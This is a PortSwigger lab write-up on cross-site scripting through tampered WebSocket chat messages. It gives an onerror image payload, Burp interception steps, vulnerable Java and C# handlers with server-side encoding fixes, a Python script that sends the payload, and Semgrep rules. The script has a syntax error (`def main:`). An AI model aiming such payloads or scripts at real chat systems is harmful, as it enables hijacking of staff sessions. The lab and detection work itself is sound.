---
title: "Lab 01: Manipulating WebSocket messages to exploit vulnerabilities"
date: 2025-12-18
categories: [portswigger, websockets]
tags: [websocket] 
image: portswigger.png
media_subpath: /assets/img/posts/2025-12-17-lab11_access_control/
--- 


## 1. Executive Summary

**Vulnerability:** Client-Side Bypassed Cross-Site Scripting (XSS) via WebSockets.
**Description:** The application implements a live chat feature using the WebSocket protocol. While the client-side JavaScript performs HTML encoding on user input before transmission, the backend fails to validate or re-encode the data before broadcasting it to other users (the support agent).
**Impact:** An attacker can inject malicious scripts that execute in the context of the support agent's browser, leading to session hijacking, sensitive data theft, or unauthorized actions on the agent's behalf.

## 2. The Attack

**Objective:** Trigger an `alert()` popup in the support agent's browser.

1. **Reconnaissance:** I initiated a "Live chat" and sent a test message. I observed the traffic in **Burp Proxy > WebSockets history**.
2. **Observation of Client-Side Defense:** I sent a message containing a `<` character. In the history, I saw that the browser's JavaScript encoded the character as `&lt;` *before* it was sent over the WebSocket.
    - *Message sent:* `Hello <test>`
    - *WebSocket data:* `{"message":"Hello &lt;test&gt;"}`
3. **Exploitation:** To bypass this client-side restriction, I used Burp's **Interception** feature for WebSockets.
    - I turned on "Intercept" in Burp Proxy.
    - I sent a dummy message from the chat box.
    - In the intercepted WebSocket frame, I replaced the encoded string with a raw XSS payload:
    `<img src=1 onerror='alert(1)'>`
4. **Result:** The backend accepted the raw HTML and rendered it in the support agent's interface. Since the image source is invalid (`src=1`), the `onerror` event fired, executing the JavaScript.

## 3. Code Review

### Java (Spring Boot)

```java
@Component
public class ChatWebSocketHandler extends TextWebSocketHandler {
    @Override
    protected void handleTextMessage(WebSocketSession session, TextMessage message) throws Exception {
        String payload = message.getPayload();
        broadcastToAgent(payload);
    }
}
```

**Technical Flow & Syntax Explanation:**

- **`handleTextMessage`**: This is a core Spring WebSocket method that automatically triggers whenever a new text frame is received from a client.
- **`message.getPayload()`**: This retrieves the raw string content of the WebSocket frame. If an attacker uses a tool like Burp, this string contains whatever they injected, completely bypassing any browser-side encoding logic.
- **The Flaw**: The variable `payload` is passed directly to the `broadcastToAgent` function. There is no server-side sanitization or encoding step, meaning the application trusts the client-side data implicitly.

### C# (ASP.NET Core)

```csharp
public async Task HandleWebSocket(HttpContext context, WebSocket webSocket)
{
    var buffer = new byte[1024 * 4];
    while (webSocket.State == WebSocketState.Open)
    {
        var result = await webSocket.ReceiveAsync(new ArraySegment<byte>(buffer), CancellationToken.None);
        string userMessage = Encoding.UTF8.GetString(buffer, 0, result.Count);
        await SendToAgent(userMessage);
    }
}
```

**Technical Flow & Syntax Explanation:**

- **`ReceiveAsync`**: This method asynchronously reads data from the WebSocket stream into a byte buffer. It does not know or care about the "meaning" of the data (e.g., if it's safe text or malicious HTML).
- **`Encoding.UTF8.GetString`**: This converts the raw bytes from the network directly into a UTF-8 string.
- **The Flaw**: The `userMessage` string is immediately sent to the agent's view via `SendToAgent`. Because the data is never checked for HTML tags, an attacker can inject script tags into the byte stream and the server will faithfully process them.

### Mock PR Comment

The WebSocket handler currently relies on client-side encoding. Because client-side logic can be bypassed with a proxy, raw HTML tags are being broadcast to the support agent's browser. Please implement server-side HTML encoding on all incoming WebSocket messages before they are processed or displayed.

## 4. The Fix

**Explanation of the Fix:**
We must assume all input is malicious. The fix is to apply HTML encoding on the server side immediately after the message is received, regardless of what the client-side UI claims to have done.

### Secure Java

```java
import org.springframework.web.util.HtmlUtils;

@Override
protected void handleTextMessage(WebSocketSession session, TextMessage message) {
    String rawPayload = message.getPayload();
    String safePayload = HtmlUtils.htmlEscape(rawPayload);
    broadcastToAgent(safePayload);
}
```

**Technical Flow & Syntax Explanation:**

- **`HtmlUtils.htmlEscape`**: This is a standard Spring utility that replaces dangerous characters (like `<`) with safe HTML entities (like `&lt;`).
- **Encoding Timing**: By encoding the message *after* it is received on the server, we ensure that even if an attacker uses Burp Suite to send raw HTML, that HTML is rendered as harmless text on the agent's screen instead of being executed as code.

### Secure C#

```csharp
using System.Text.Encodings.Web;

string userMessage = Encoding.UTF8.GetString(buffer, 0, result.Count);
string safeMessage = HtmlEncoder.Default.Encode(userMessage);
await SendToAgent(safeMessage);
```

**Technical Flow & Syntax Explanation:**

- **`HtmlEncoder.Default.Encode`**: This is the built-in .NET security library for sanitizing output. It identifies any characters that could be used for XSS and converts them into a format that a browser will treat as display text, not executable script.
- **Security Context**: This fix addresses the root cause by ensuring that the "Trust Boundary" is correctly placed at the server entrance, not in the client-side browser.

## 5. Automation

```python
#!/usr/bin/env python3
import argparse
import json
import websocket # pip install websocket-client
import sys

def exploit_websocket(url, payload):
    ws_url = url.replace("https://", "wss://").rstrip("/") + "/chat"
    print(f"[*] Connecting to: {ws_url}")

    try:
        ws = websocket.create_connection(ws_url)
        msg = {"message": payload}
        ws.send(json.dumps(msg))
        print(f"[+] Payload sent:{payload}")
        ws.close()
    except Exception as e:
        print(f"[-] Error: {e}")

def main:
    ap = argparse.ArgumentParser()
    ap.add_argument("url", help="Lab URL")
    ap.add_argument("--payload", default="<img src=1 onerror='alert(1)'>")
    args = ap.parse_args()
    exploit_websocket(args.url, args.payload)

if __name__ == "__main__":
    main()
```

## 6. Static Analysis (Semgrep)

**The Logic:We are identifying instances where a string derived from a WebSocket message is passed to a broadcast/send function without being passed through a known sanitizer like `htmlEscape` or `Encode`.**

### Java Rule

```yaml
rules:
  - id: java-ws-missing-sanitization
    languages: [java]
    message: "WebSocket payload used without HTML encoding."
    severity: WARNING
    patterns:
      - pattern: |
          String $P = $MSG.getPayload();
          ...
          $FUNC(..., $P, ...);
      - pattern-not: |
          String $P = HtmlUtils.htmlEscape(...);
```

**Technical Flow & Syntax Explanation:**

- **`$P = $MSG.getPayload()`**: This captures the assignment of the untrusted WebSocket data to a variable.
- **`$FUNC(..., $P, ...)`**: This identifies where that untrusted variable is used later in the code.
- **`pattern-not`**: This acts as a filter; if the code *is* using a sanitization function, Semgrep will ignore it. This ensures we only flag the vulnerable cases.

### C# Rule

```yaml
rules:
  - id: csharp-ws-missing-sanitization
    languages: [csharp]
    message: "WebSocket message broadcasted without HtmlEncoder."
    severity: WARNING
    patterns:
      - pattern: |
          string $S = Encoding.UTF8.GetString(...);
          ...
          await $SEND($S);
      - pattern-not: |
          string $S = HtmlEncoder.Default.Encode(...);
```

**Technical Flow & Syntax Explanation:**

- **`Encoding.UTF8.GetString(...)`**: This specifically targets the line where the raw network bytes are turned into a string.
- **`await $SEND($S)`**: This looks for the point where that string is sent back to the agent or other clients.
- **`pattern-not`**: Just like the Java rule, this verifies that the `HtmlEncoder` is missing before raising a warning, reducing false positives in secure codebases.
